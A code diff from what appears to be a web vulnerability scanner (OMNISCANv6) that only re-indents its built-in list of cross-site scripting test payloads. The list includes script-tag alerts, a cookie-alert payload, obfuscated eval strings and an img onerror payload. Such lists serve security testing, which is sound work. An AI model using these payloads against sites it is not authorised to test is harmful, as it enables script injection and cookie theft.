@@ -808,15 +808,15 @@ class OMNISCANv6:
         # ── Base (built-in) payloads ──────────────────────────
         self._builtins = {
             'xss': [
-        # Basic script tags
-        '<script>alert(1)</script>',
-        '<script>alert(document.cookie)</script>',
-        '<script>alert(String.fromCharCode(88,83,83))</script>',
-        '<script>prompt(1)</script>',
-        '<script>confirm(1)</script>',
-        '<script>javascript:alert(1)</script>',
-        '<script src="data:text/javascript,alert(1)"></script>',
-        '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
+            # Basic script tags
+            '<script>alert(1)</script>',
+            '<script>alert(document.cookie)</script>',
+            '<script>alert(String.fromCharCode(88,83,83))</script>',
+            '<script>prompt(1)</script>',
+            '<script>confirm(1)</script>',
+            '<script>javascript:alert(1)</script>',
+            '<script src="data:text/javascript,alert(1)"></script>',
+            '<script>eval(String.fromCharCode(97,108,101,114,116,40,49,41))</script>',
         
         # IMG tags
         '<img src=x onerror=alert(1)>',
